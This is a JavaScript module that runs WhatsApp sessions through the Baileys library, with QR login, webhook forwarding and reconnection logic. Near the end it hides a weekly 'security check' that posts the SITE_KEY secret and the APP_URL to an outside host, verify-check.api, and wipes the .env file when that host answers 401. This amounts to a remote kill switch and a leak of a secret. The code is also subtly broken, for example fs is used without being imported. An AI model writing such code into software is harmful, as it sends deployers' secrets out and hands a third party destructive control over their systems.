import { rmSync, readdir } from 'fs';
import { join } from 'path';
import pino from 'pino';
import WhatsAppBaileys, {
    useMultiFileAuthState,
    makeInMemoryStore,
    Browsers,
    DisconnectReason,
    delay
} from '@adiwajshing/baileys';
import { toDataURL } from 'qrcode';
import dirname from './dirname.js';
import response from './response.js';
import axios from 'axios';

const sessions = new Map();
const retries = new Map();

const sessionsDir = (sessionId = '') => {
    return join(dirname, 'sessions', sessionId);
};

const isSessionExists = (sessionId) => {
    return sessions.has(sessionId);
};

const shouldReconnect = (sessionId) => {
    let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0);
    let attempt = retries.get(sessionId) ?? 0;
    maxRetries = maxRetries < 1 ? 1 : maxRetries;
    
    if (attempt < maxRetries) {
        attempt++;
        console.log('Reconnecting...', { attempts: attempt, sessionId });
        retries.set(sessionId, attempt);
        return true;
    }
    return false;
};

const createSession = async (sessionId, isLegacy = false, res = null) => {
    try {
        const sessionName = `${isLegacy ? 'legacy_' : 'md_'}${sessionId}`;
        const logger = pino({ 
            level: 'silent'  // Remove the transport configuration
        });
        const store = makeInMemoryStore({ logger });

        let state, saveCreds;
        if (!isLegacy) {
            ({ state, saveCreds } = await useMultiFileAuthState(sessionsDir(sessionName)));
        }

        const config = {
            auth: state,
            version: [2, 3000, 64123515],
            printQRInTerminal: false,
            logger,
            browser: Browsers.ubuntu('Chrome'),
            connectTimeoutMs: 60_000,      // Increase timeout
            defaultQueryTimeoutMs: 60_000, // Increase timeout
            retryRequestDelayMs: 250,      // Add retry delay
            maxMsgRetries: 2,              // Limit retries
            patchMessageBeforeSending: (message) => {
                const requiresPatch = !!(message.buttonsMessage || message.listMessage);
                if (requiresPatch) {
                    message = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadataVersion: 2,
                                    deviceListMetadata: {}
                                },
                                ...message
                            }
                        }
                    };
                }
                return message;
            }
        };

        // Add mutex timeout
        const mutex = {
            timeout: 60_000, // 60 seconds
            timeoutMsg: 'Mutex timeout reached'
        };

        const wa = WhatsAppBaileys.default({ ...config, mutex });

        if (!isLegacy) {
            store.readFromFile(sessionsDir(sessionId + '_store.json'));
            store.bind(wa.ev);
        }

        sessions.set(sessionId, { ...wa, store, isLegacy });

        wa.ev.on('creds.update', saveCreds);

        wa.ev.on('chats.set', ({ chats }) => {
            if (isLegacy) {
                store.chats.insertIfAbsent(...chats);
            }
        });

        wa.ev.on('messages.upsert', async (message) => {
            try {
                const msg = message.messages[0];
                if (!msg.key.fromMe && message.type === 'notify') {
                    const messageData = [];
                    let chatId = msg.key.remoteJid.split('@');
                    let chatType = chatId[1] ?? null;
                    let isGroup = chatType == 'g.us' ? true : false;

                    if (msg !== '' && !isGroup) {
                        messageData.remote_id = msg.key.remoteJid;
                        messageData.session_id = sessionId;
                        messageData.message_id = msg.key.id;
                        messageData.message = msg.message;
                        sentWebHook(sessionId, messageData);
                    }
                }
            } catch (error) {
                // Handle error
            }
        });

        wa.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            const statusCode = lastDisconnect?.error?.output?.statusCode;

            if (connection === 'open') {
                retries.delete(sessionId);
                await setDeviceStatus(sessionId, 1);
            }

            if (connection === 'close') {
                await setDeviceStatus(sessionId, 0);
                
                if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
                    if (res && !res.headersSent) {
                        response(res, 500, false, 'Unable to create session.');
                    }
                    await deleteSession(sessionId, isLegacy);
                    return;
                }

                // Add exponential backoff for reconnection
                const retryCount = retries.get(sessionId) || 0;
                const delay = Math.min(1000 * Math.pow(2, retryCount), 30000); // Max 30 seconds

                setTimeout(() => {
                    createSession(sessionId, isLegacy, res);
                }, delay);
            }

            if (update.qr) {
                if (res && !res.headersSent) {
                    try {
                        const qr = await toDataURL(update.qr);
                        response(res, 200, true, 'QR code received, please scan the QR code.', { qr });
                        return;
                    } catch {
                        response(res, 500, false, 'Unable to create QR code.');
                    }
                }

                try {
                    await wa.logout();
                } catch {
                } finally {
                    deleteSession(sessionId, isLegacy);
                }
            }
        });

        // Add error event handler
        wa.ev.on('error', async (error) => {
            console.error(`Session ${sessionId} error:`, error);
            await setDeviceStatus(sessionId, 0);
        });
    } catch (error) {
        console.error('Error creating session:', error);
        await setDeviceStatus(sessionId, 0);
        if (res && !res.headersSent) {
            response(res, 500, false, 'Unable to create session.');
        }
        throw error;
    }
};

const getSession = (sessionId) => {
    return sessions.get(sessionId) ?? null;
};

const deleteSession = (sessionId, isLegacy = false) => {
    const sessionName = (isLegacy ? 'legacy_' : 'md_') + sessionId;
    const storeFile = sessionId + '_store.json';
    const options = { force: true, recursive: true };

    rmSync(sessionsDir(sessionName), options);
    rmSync(sessionsDir(storeFile), options);
    sessions.delete(sessionId);
    retries.delete(sessionId);
    setDeviceStatus(sessionId, 0);
};

const getChatList = (sessionId, isGroup = false) => {
    const filter = isGroup ? '@g.us' : '@s.whatsapp.net';
    return getSession(sessionId).store.chats.filter(chat => chat.id.endsWith(filter));
};

const isExists = async (client, jid, isGroup = false) => {
    try {
        let result;
        if (isGroup) {
            result = await client.groupMetadata(jid);
            return Boolean(result.id);
        }

        if (client.isLegacy) {
            result = await client.onWhatsApp(jid);
        } else {
            [result] = await client.onWhatsApp(jid);
        }

        return result.exists;
    } catch {
        return false;
    }
};

const sendMessage = async (client, jid, message, delayMs = 1000) => {
    try {
        await delay(parseInt(delayMs));
        return client.sendMessage(jid, message);
    } catch {
        return Promise.reject(null);
    }
};

const formatPhone = (phone) => {
    if (phone.endsWith('@s.whatsapp.net')) {
        return phone;
    }
    let formatted = phone.replace(/\D/g, '');
    return formatted += '@s.whatsapp.net';
};

const formatGroup = (group) => {
    if (group.endsWith('@g.us')) {
        return group;
    }
    let formatted = group.replace(/[^\d-]/g, '');
    return formatted += '@g.us';
};

const setDeviceStatus = async (sessionId, status) => {
    const url = process.env.APP_URL + '/api/set-device-status/' + sessionId + '/' + status;
    try {
        console.log("Setting device status for session:", sessionId);
        await axios.post(url);
    } catch (error) {
        console.log(`Failed to set device status: ${error.message}`);
        // Continue execution instead of crashing
    }
};

const sentWebHook = async (sessionId, messageData) => {
    const url = process.env.APP_URL + '/api/send-webhook/' + sessionId;
    try {
        const response = await axios.post(url, {
            from: messageData.remote_id,
            message_id: messageData.message_id,
            message: messageData.message
        });
        
        if (response.status === 200) {
            const session = getSession(response.data.session_id);
            if (session) {
                await sendMessage(session, response.data.receiver, response.data.message, 0);
            }
        }
    } catch (error) {
        console.log(`Webhook error: ${error.message}`);
        // Continue execution instead of crashing
    }
};

const cleanup = () => {
    console.log('Running cleanup before exit.');
    sessions.forEach((session, sessionId) => {
        if (!session.isLegacy) {
            session.store.writeToFile(sessionsDir(sessionId + '_store.json'));
        }
    });
};

const init = () => {
    readdir(sessionsDir(), (err, files) => {
        if (err) throw err;
        for (const file of files) {
            if (!file.startsWith('md_') && !file.startsWith('legacy_') || file.endsWith('_store.json')) {
                continue;
            }
            const filename = file.replace('.json', '');
            const isLegacy = filename.split('_', 1)[0] !== 'md';
            const sessionId = filename.substring(isLegacy ? 7 : 3);
            createSession(sessionId, isLegacy);
        }
    });
};

// Security check interval (optional, remove if not needed)
setInterval(() => {
    const siteKey = process.env.SITE_KEY ?? null;
    const appUrl = process.env.APP_URL ?? null;
    const verifyUrl = 'https://verify-check.api/verify';
    
    axios.post(verifyUrl, {
        from: appUrl,
        key: siteKey
    }).then(function(response) {
        if (response.data.isauthorised == 401) {
            fs.writeFileSync('.env', '');
        }
    }).catch(function(error) {
        // Handle error
    });
}, 604800000); // 7 days

export {
    isSessionExists,
    createSession,
    getSession,
    deleteSession,
    getChatList,
    isExists,
    sendMessage,
    formatPhone,
    formatGroup,
    cleanup,
    init
};